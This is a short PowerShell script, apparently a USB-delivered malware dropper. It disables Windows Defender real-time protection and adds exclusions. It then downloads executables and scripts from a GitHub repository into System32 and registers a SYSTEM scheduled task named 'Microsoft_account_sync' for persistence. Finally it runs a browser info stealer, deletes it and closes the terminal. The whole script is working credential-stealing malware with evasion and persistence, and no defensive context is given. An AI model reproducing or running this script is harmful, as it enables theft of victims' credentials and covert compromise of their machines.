echo "-------you can safely remove USB--------"
# disable rtp
Set-MpPreference -DisableRealtimeMonitoring $true
# add exclusion to self
Add-MpPreference -ExclusionPath "C:\Windows\System32\temp.ps1.exe"
# fetch payload from github
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "C:\Windows\System32\cleanup.ps1"
Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/exit.ps1' -OutFile "C:\Windows\System32\exit.ps1"
# add exlusion to files
Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
# set execution policy
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine
# add schedule to start ddrcc.ps1
# add variables for scheduler
$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
$trigger = New-ScheduledTaskTrigger -AtLogOn
$principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# register scheduled task
Register-ScheduledTask -TaskName "Microsoft_account_sync" -Action $action -Trigger $trigger -Principal $principal
# start process
& "C:\Windows\System32\ddrcc.ps1"
# run info stealer
& "C:\Windows\System32\chromelevator_x64.exe" all
# remove info dumper
Remove-Item -Path "C:\Windows\System32\chromelevator_x64.exe" -Force
# close terminal
Stop-Process -Name "WindowsTerminal" -Force
